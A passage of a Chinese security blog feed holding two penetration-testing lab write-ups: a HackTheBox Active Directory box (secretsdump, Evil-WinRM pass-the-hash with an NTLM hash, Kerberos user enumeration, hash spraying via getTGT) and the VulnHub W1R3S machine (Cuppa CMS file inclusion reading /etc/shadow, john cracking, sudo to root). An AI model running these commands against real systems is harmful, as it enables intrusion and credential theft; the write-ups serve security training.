alt="image-20230402002338557"></p><blockquote><p><strong>通过在命令行中添加”-system”参数来指定要提取信息的目标Windows系统</strong>。该参数后面需要跟上目标系统的System文件的本地路径或UNC路径。System文件是包含了Windows系统的安全策略和用户凭据哈希值的文件。如果未指定”-system”参数，则默认使用当前正在运行该工具的本地系统的System文件。</p><p>例如，以下命令将使用本地System文件提取目标IP地址为192.168.0.1的Windows系统中的凭据和密码哈希：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py 192.168.0.1 -u username -p password</span><br></pre></td></tr></table></figure><p>如果要使用指定路径的System文件，可以添加”-system”参数并指定文件路径，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py 192.168.0.1 -u username -p password -system C:\Windows\System32\config\SYSTEM</span><br></pre></td></tr></table></figure></blockquote><p><strong>Evil-WinRM</strong></p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402003641336.png" alt="image-20230402003641336"></p><blockquote><p>Evil-WinRM是一款基于Ruby编写的Windows远程管理工具，它通过WinRM协议进行连接和交互。WinRM是Microsoft提供的一种远程管理协议，可以在Windows操作系统上实现远程执行命令、传输文件等操作，类似于SSH协议在Linux系统上的作用。</p></blockquote><p>其中：</p><p>“-i htb.local”指定要连接的目标主机为”htb.local”，即目标主机的主机名或IP地址。</p><p>“-u administrator”指定要使用的用户名为”administrator”，即需要连接到目标主机的账户名。</p><p>“-H ‘2b576acbe6bcfda7294d6bd18041b8fe’”指定连接目标主机时要使用的密码散列值。这里使用了NTLM hash值，用于身份验证和权限提升等操作。</p><blockquote><p>这条命令的作用是使用Evil-WinRM工具连接到指定的目标主机，并使用指定的用户名和密码散列值进行身份验证。如果验证成功，可以使用工具提供的交互式命令行终端执行命令或进行其他操作，例如上传或下载文件，执行PowerShell脚本等。</p></blockquote><p>从结果表明，并不清楚主机htb.local对应的用户 与密码散列值，因此我们要对user_hash_raw里面的数据进行提取，将用户名提取出来存放在user_list中，将密码散列值存放在user_hash中</p><p>对应的提取命令为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo cat user_hash_raw | grep &#x27;:::&#x27; | awk /F &#x27;:&#x27; &#123;print$1&#125; &gt; user_list</span><br><span class="line">sudo cat user_hash_raw | grep &#x27;:::&#x27; | awk /F &#x27;:&#x27; &#123;print$3,$4&#125; | sed &#x27;s/ /:/g&#x27; &gt; user_hash</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">含有:::字符串的行所需要的内容 每个用户账户信息的末尾通常有三个冒号<span class="string">&quot;:::&quot;</span>，这是为了填充该用户的密码字段。</span></span><br></pre></td></tr></table></figure><p>此时有个问题，那就是user_list 与user_hash都有2000行数据，如果直接用这些内容进行碰撞的话，那么效率会比较低下，此时可利用kerbrute对user验证（通过88端口），也可以利用nmap。</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402010610625.png" alt="image-20230402010610625"></p><blockquote><p>使用<code>userenum</code>模块对<code>htb.local</code>域中的用户进行枚举，并使用<code>--dc</code>参数指定域控制器的主机名或IP地址为<code>htb.local</code>，<code>user_list</code>则是一个包含要枚举的用户名列表的文本文件。</p></blockquote><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402011056520.png" alt="image-20230402011056520"></p><blockquote><ul><li><code>-6</code> 指定 Nmap 应使用 IPv6 协议而不是 IPv4。</li><li><code>-p88</code> 指定 Nmap 应扫描 TCP 端口 88，也就是 Kerberos 认证服务的默认端口。</li><li><code>--script=krb5-enum-users</code> 指定 Nmap 应使用 krb5-enum-users 脚本来扫描目标系统，以便枚举 Kerberos 认证服务中存在的用户帐户。</li><li><code>--script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=user_list</code> 提供脚本所需的参数。其中 <code>krb5-enum-users.realm=&#39;htb.local&#39;</code> 指定 Kerberos 域名为 “htb.local”，<code>userdb=user_list</code> 指定用户列表文件的名称为 “user_list”。</li><li><code>htb.local</code> 是要扫描的目标系统的名称或 IP 地址。</li></ul></blockquote><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402011528557.png" alt="image-20230402011528557"></p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402011541090.png" alt="image-20230402011541090"></p><p>结果表明存在三个用户</p><blockquote><p>在扫描结果中出现 <code>APT$@htb.local</code> 的情况通常是指在 Kerberos 认证服务中发现了一个服务帐户。在 Kerberos 中，服务帐户的名称通常以 <code>$</code> 符号结尾，这样可以将它们与普通用户帐户区分开来。<code>APT</code> 是服务帐户的名称，<code>htb.local</code> 是域名。</p><p>服务帐户是用于运行服务或应用程序的帐户，它们通常拥有特定的权限和访问控制。在一些情况下，攻击者可以利用已知的服务帐户漏洞来提升其权限或执行攻击，因此服务帐户的安全性也非常重要。</p></blockquote><h3 id="Crackmapexec碰撞"><a href="#Crackmapexec碰撞" class="headerlink" title="Crackmapexec碰撞"></a>Crackmapexec碰撞</h3><blockquote><p>CrackMapExec (CME) 是一款强大的渗透测试工具，用于自动化身份验证、口令破解、权限提升等任务，可帮助渗透测试人员快速地检测和利用网络中存在的安全漏洞。</p><p>该工具支持多种操作系统，包括Windows、Linux和Mac OS X等，并支持多种协议，如 SMB、LDAP、HTTP 等。其核心功能包括：</p><ul><li>自动化的密码破解：CrackMapExec 可以自动化地枚举和破解用户口令，并支持使用字典和暴力破解等多种方式。</li><li>用户权限提升：该工具可以通过利用漏洞提升用户权限，获取更高的访问权限。</li><li>横向移动：CrackMapExec 可以在不同的主机之间进行横向移动，以便在目标网络中自由移动和扩展攻击面。</li></ul></blockquote><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230402235202565.png" alt="image-20230402235202565"></p><p>在正常碰撞几次之后出现timed out 报错，再次输入命令则直接无结果显示，推测出目标主机有一定的防护措施（如：失败几次登陆之后锁定）</p><h3 id="域用户hash碰撞getTGT"><a href="#域用户hash碰撞getTGT" class="headerlink" title="域用户hash碰撞getTGT"></a>域用户hash碰撞getTGT</h3><blockquote><p>Kerberos实际上是一种基于票据（Ticket）的认证方式。客户端要访问服务器的资源，需要首先购买服务端认可的票据。也就是说，客户端在访问服务器之前需要预先买好票，等待服务验票之后才能入场。在这之前，客户端需要先买票，但是这张票不能直接购买，需要一张认购权证。客户端在买票之前需要预先获得一张认购权证。这张认购权证和进入服务器的入场券均有KDC发售。</p><p>过程中涉及到的专有名词有：</p><p>KDC(Key Distribution Center) : 密钥分发中心<br>KAS(Kerberos Authentication Service) : kerberos认证服务<br>TGT(Ticket Granting Ticket) : 认购权证<br>TGS(Ticket Granting Service) : 票据授予服务<br>ST(Service Ticket) : 服务票据</p><h3 id="获取TGT"><a href="#获取TGT" class="headerlink" title="获取TGT"></a>获取TGT</h3><p>客户端要先拿到TGT，然后才能购买ST进行对应服务的访问</p><p>过程：首先在用户登陆时，Kerberos服务向KDC(域控)发送申请认购权证的请求，内容为登录输入的用户名和经过输入密码加密的Authenticator(用于确认身份的)</p><p>KDC(域控)拿到传来的数据后，会根据用户名到活动目录(Active Directory)的数据库中寻找该用户的密码，然后使用该密码解密加密的Authenticator，然后与原始的Authenticator对比，如果一致，则确认用户身份。</p><p>KDC(域控)确认登录用户身份正确后，先生成一个由用户密码加密的加密Logon Session Key（为了确保通信安全）。然后生成TGT(包含用户信息和原始Logon Session Key)，再使用KDC的密钥（即krbrgt用户的密钥）加密TGT生成加密后的TGT。然后将由用户密码加密的加密Logon Session Key和加密后的TGT返回给客户端</p><p>客户端拿到加密Logon Session Key和TGT后，先用自己的密码解密加密Logon Session Key得到原始Logon Session Key，然后将原始Logon Session Key和TGT缓存到本地</p></blockquote><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230403112616301.png" alt="image-20230403112616301"></p><blockquote><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getTGT.py htb.<span class="keyword">local</span>/henry.vinson@htb.<span class="keyword">local</span> -hashes 哈希值</span><br></pre></td></tr></table></figure><p>其中，“htb.local&#x2F;henry.<a href="mailto:vinson@htb.local">vinson@htb.local</a>”是目标Kerberos域和用户的身份，而“哈希值”是使用NTLM哈希算法生成的用户密码的哈希值。此脚本通常用于破解NTLM哈希值并生成TGT，以便在渗透测试或攻击中进行身份验证。</p><p>while循环</p><p>第一部分“IFS&#x3D;’’ read -r LINE”表示读取名为“hash_list”的文件中的一行，并将其赋值给变量“LINE”。此外，将<strong>IFS设置为空字符串（即将分隔符设置为空格字符）</strong>，以便处理行中的多个字段。</p><p>第二部分“|| [ -n “${LINE}” ]”表示当第一部分无法读取新行时（文件结束），则退出循环，否则继续循环。这是通过检查变量“LINE”的值是否为空来实现的。如果“LINE”为空，则意味着已经读取到了文件的末尾，循环将退出；否则，循环将继续，读取下一行数据并执行循环体中的命令。</p></blockquote><p>由于成功取回TGT会生成ccache文件，通过以下命令对目录内容进行监视</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch <span class="string">&quot;ls -ltr | tail -2&quot;</span></span><br></pre></td></tr></table></figure><p>当能够获得TGT时，即对应的用户名和hash是匹配的</p><p><img src="C:\Users\ljx\AppData\Roaming\Typora\typora-user-images\image-20230403113535364.png" alt="image-20230403113535364"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ART&quot;&gt;&lt;a href=&quot;#ART&quot; class=&quot;headerlink&quot; title=&quot;ART&quot;&gt;&lt;/a&gt;ART&lt;/h1&gt;&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ljx-go.top/2023/04/08/W1R3S/"/>
    <id>http://ljx-go.top/2023/04/08/W1R3S/</id>
    <published>2023-04-08T12:47:51.647Z</published>
    <updated>2023-03-10T15:48:09.227Z</updated>
    
    <content type="html"><![CDATA[<h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><p>靶机名：W1R3S</p><p>靶机地址：<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">https://www.vulnhub.com/entry/w1r3s-101,220/</a></p><p>下载地址：<strong>下载（镜像）</strong>：<a href="https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip</a></p><p>描述：你被雇来对W1R3S做渗透测试。公司个人服务器并报告所有发现。他们要求您获得root权限并找到标志(位于&#x2F;root目录中)。</p><p>目标：得到root权限&amp;找到flag.txt</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>1.主机发现</p><p>开启靶机后用nmap扫描发现靶机ip</p><p><code>sudo nmap -sn 192.168.37.0/24</code> （不知道具体ip可以通过关闭靶机前后分别扫描）</p><p>ip地址为  <code>192.168.37.137</code></p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306232808593.png" alt="image-20230306232808593" style="zoom: 67%;" /><p>2.端口扫描</p><p><code>sudo nmap --min-rate 10000 -p- 192.168.37.137</code>  设置–min-rate参数确保扫得全and准确</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306234024911.png" alt="image-20230306234024911"></p><p>识别端口相关信息</p><p><code>sudo nmap -sT -sV -O -p21,22,80,3306 192.168.37.137</code> -sT用TCP协议 -sV获得对应服务的版本信息 -O获得主机信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306234448903.png" alt="image-20230306234448903"></p><p><code>sudo nmap -sU -p21,22,80,3306 192.168.37.137</code> -sU用udp协议 (往往开发人员忽略了UDP协议)</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306235136429.png" alt="image-20230306235136429"></p><p>4个端口侧重点：80&gt;21&gt;3306&gt;22</p><p>其中ssh服务 一般是通过暴力破解password  所以为最不可能一项</p><p><code>sudo nmap --script=vuln -p21,22,80,3306 192.168.37.137</code></p><p>利用nmap自带的漏洞扫描对端口进行扫描</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307000604489.png" alt="image-20230307000604489"></p><p>从结果得知21 22端口没有信息  80端口中web服务框架为wordpress 是重点突破的地方</p><p>MAC地址显示VMware 如果是在真实环境中获得的，宿主环境很可能是window系统</p><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><h4 id="测试ftp是否允许匿名登陆"><a href="#测试ftp是否允许匿名登陆" class="headerlink" title="测试ftp是否允许匿名登陆"></a>测试ftp是否允许匿名登陆</h4><p><a href="https://www.bilibili.com/read/cv10444306?from=search">FTP（匿名登录）未授权访问漏洞</a></p><p>FTP的匿名登录一般有三种：<br>1、 用户名：anonymous 密码：Email或者为空<br>2、 用户名：FTP 密码：FTP或者为空<br>3、 用户名：USER 密码：pass</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307003058115.png" alt="image-20230307003058115"></p><p>成功匿名登陆</p><p><strong>注！！！  ftp登陆后 需要输入binary切换一下</strong> </p><p>原因ftp 默认为ascii获取文件内容，当获取的文件为可执行文件时，不输入binary则可能会损坏可执行文件</p><p><strong>ftp文件下载命令 wget +文件名</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307003500326.png"></p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004356477.png" alt="image-20230307004356477"></p><p>其中 employee-names.txt涉及一些敏感信息泄露 可能对于后续有用</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004844476.png" alt="image-20230307004844476"></p><h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><h4 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h4><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307103605194.png" alt="image-20230307103605194"></p><p>前面得知它是一个wordpress框架，通过目录爆破获得对应框架的路径</p><h4 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h4><p>利用feroxbuster及kali自带字典进行爆破  路径：<code>/usr/share/seclists/</code></p><p><a href="https://blog.csdn.net/Jiajiajiang_/article/details/88638367">kali系统自带字典wordlists简介</a></p><p><code>feroxbuster -u http://192.168.37.137 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></p><p>扫描结果</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004531661.png" alt="image-20230308004531661"></p><p>其中wordpress 与 administrator目录</p><h4 id="Cuppa-CMS"><a href="#Cuppa-CMS" class="headerlink" title="Cuppa CMS"></a>Cuppa CMS</h4><p>先访问<a href="http://192.168.37.137/administrator">http://192.168.37.137/administrator</a> 获得一个CMS安装界面</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004759753.png" alt="image-20230308004759753"></p><p>点击next后出现注册信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004837893.png" alt="image-20230308004837893"></p><p>随意填写再次点击next后安装失败   提示没有Administrator权限 此路不通</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004937654.png" alt="image-20230308004937654"></p><p>用searchsploit搜索cuppa cms相关漏洞</p><p><a href="https://blog.csdn.net/qq_63844103/article/details/128405733">【网安神器篇】——searchsploit漏洞利用搜索工具</a> </p><p>查询到相关漏洞描述文件 并用-m参数将一个漏洞利用镜像（副本）到当前工作目录(后面跟漏洞ID号) </p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308110519802.png" alt="image-20230308110519802"></p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308231808038.png" alt="image-20230308231808038"></p><p>get传参访问 没有结果  </p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308231847812.png" alt="image-20230308231847812" style="zoom:50%;" /><p>由于$_REQUEST可以用post传参  所以用curl尝试post传参</p><p><code>curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.37.137/administrator/alerts/alertConfigField.php</code></p><p>成功获得&#x2F;etc&#x2F;passwd内容   <a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释</a></p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308232053571.png" alt="image-20230308232053571" style="zoom:67%;" /><p>尝试查看&#x2F;etc&#x2F;shadow文件   <a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</a></p><p><code>curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.37.137/administrator/alerts/alertConfigField.php</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308233232927.png" alt="image-20230308233232927"></p><p>将&#x2F;etc&#x2F;shadow中三个较长的信息收集在一个txt文件内 用john破解</p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308234943255.png"></p><p>获得其中两个用户的账号密码，很明显可以看出w1r3s权限更高些</p><p>利用账号密码ssh远程登陆</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309143845639.png" alt="image-20230309143845639"></p><p>成功getshell</p><p>查询权限   <code>sudo -l</code> 显示了允许当前用户使用的命令</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309144316710.png" alt="image-20230309144316710"></p><p>利用sudo提权 <code>sudo /bin/bash</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309144822739.png" alt="image-20230309144822739"></p><p>获得flag.txt  结束本次靶机的练习</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309145240649.png" alt="image-20230309145240649"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;靶场介绍&quot;&gt;&lt;a href=&quot;#靶场介绍&quot; class=&quot;headerlink&quot; title=&quot;靶场介绍&quot;&gt;&lt;/a&gt;靶场介绍&lt;/h2&gt;&lt;p&gt;靶机名：W1R3S&lt;/p&gt;
&lt;p&gt;靶机地址：&lt;a href=&quot;https://www.vulnhub.com/entry/w</summary>
      
    
    
    
    
  </entry>
  
</feed>
